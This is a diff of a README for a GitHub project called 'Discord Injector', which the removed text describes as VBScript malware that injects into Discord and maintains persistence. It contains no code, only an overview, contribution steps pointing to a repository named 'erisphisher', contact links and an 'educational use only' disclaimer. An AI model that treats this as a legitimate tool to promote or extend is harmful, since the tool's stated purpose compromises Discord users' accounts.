@@ -1,40 +1,61 @@
-[github-link]: https://github.com/k4itrun/discord-vbs-injector
-[github-discord-injection-link]: https://github.com/k4itrun/discord-injection
+![Header](https://github.com/k4itrun/vbs-injector/assets/103044629/f8c32008-5bba-4471-af31-570442b14a9f)
 
-<div align="center">
-
-# [Discord Injector][github-link]
-
-This Visual Basic malware allows you to inject into any Discord instance while maintaining effective persistence through advanced [Discord injection][github-discord-injection-link].
-
-</div>
+---
 
 ## Overview
 
 **Discord Injector**  is a tool designed to inject and maintain persistence within Discord using VBScript.
 
-The real purpose of all this is done through [Discord injection][github-discord-injection-link].
+The real purpose of all this is done through [Discord injection](https://github.com/k4itrun/discord-injection).
 
 ## Contributing
-We welcome your contributions to this project! If you have suggestions or improvements, please feel free to open an issue or submit a pull request with your changes. Your involvement from the community is highly valued.
 
-If you’d like to support the development of this project, consider leaving a star ⭐ or making a donation. Every bit of support is greatly appreciated!
+### Reporting Issues
+
+If you encounter any bugs or problems while using the tool, please open a [new Issue here](https://github.com/k4itrun/erisphisher/issues).
+To help us assist you faster, include as much detail as possible, such as:
+
+- What you were trying to do.
+- Any error messages or console logs.
+- Your environment details (OS, versions, etc.)
+
+The more info you provide, the quicker we can identify and fix the problem.
+
+### Pull Requests
+
+Thanks for wanting to contribute! To submit improvements or fixes, please follow these steps:
+
+1. Clone [this repository](https://github.com/k4itrun/erisphisher.git) using `git clone https://github.com/k4itrun/erisphisher.git`.
+2. Create a new branch from `main` with a clear, descriptive name, for example: `git checkout -b feature/your-feature-name`.
+3. Make your changes and commit them with clear, meaningful messages.
+4. Open a [new Pull Request here](https://github.com/k4itrun/erisphisher/pulls), explaining what you added or fixed and why.
+
+We’ll carefully review each PR and provide feedback if needed to help you get it merged.
+
+☕ **[Thank you for your support!](https://ko-fi.com/A0A11481X5)**
 
 ## Contact
-For inquiries, reach out at [billoneta@proto.me](mailto:billoneta@proto.me) or join our [Discord Server](https://discord.gg/XS6btuuUR7).
+
+If you have any **Questions** or need **Help**, feel free to email me at <tsx@billoneta.xyz> or join the **[Discord server](https://discord.gg/CMNd45AXvD)**.
 
 ## License
-This software is licensed under the [MIT License](LICENSE).
+
+This project is released under the **[MIT License](license.md)**. See LICENSE file for more info.
 
 ## Disclaimer
-### Essential Advisory: This tool is for educational use only.
-This tool is intended for educational purposes only. Misuse will not be supported, and by using it, you agree to these terms.
+
+### Important Notice: Educational Use Only.
+
+This tool is designed solely for educational purposes. Any misuse of this tool is strictly prohibited. By using this tool, you acknowledge and accept these terms.
 
 ### User Accountability:
-By using this tool, you accept full responsibility for your actions. Misuse of this software is prohibited, and the creator disclaims any liability. Ensure your usage complies with all relevant laws.
+
+By utilizing this tool, you take full responsibility for your actions. The creator disclaims any liability for misuse. It is your responsibility to ensure that your use of this software complies with all applicable laws and regulations.
 
 ### No Assistance:
-The creator will not provide support or address misuse. Inquiries related to harmful use will be ignored.
+
+The creator will not provide assistance or support for any misuse of this tool. Any inquiries related to harmful or illegal activities will be ignored.
 
 ### Terms Acceptance:
-By using this tool, you agree to this disclaimer. If you do not agree, refrain from using the software.
+
+By using this tool, you agree to abide by this disclaimer. If you do not agree with these terms, please do not use the software.
